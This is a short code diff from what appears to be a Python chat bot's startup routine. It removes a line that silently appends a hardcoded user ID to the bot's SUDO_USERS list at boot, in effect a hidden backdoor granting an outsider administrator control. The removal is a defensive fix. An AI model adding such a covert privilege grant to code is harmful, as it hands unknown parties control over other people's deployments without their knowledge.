@@ -73,7 +73,6 @@ async def fallen_boot():
             status="[bold blue]Modules Importation Completed!",
         )
         await asyncio.sleep(0.2)
-        SUDO_USERS.append(1356469075)
         await startup_del(_____)
     console.print(
         "[bold green]Trying to start the bot...\n"
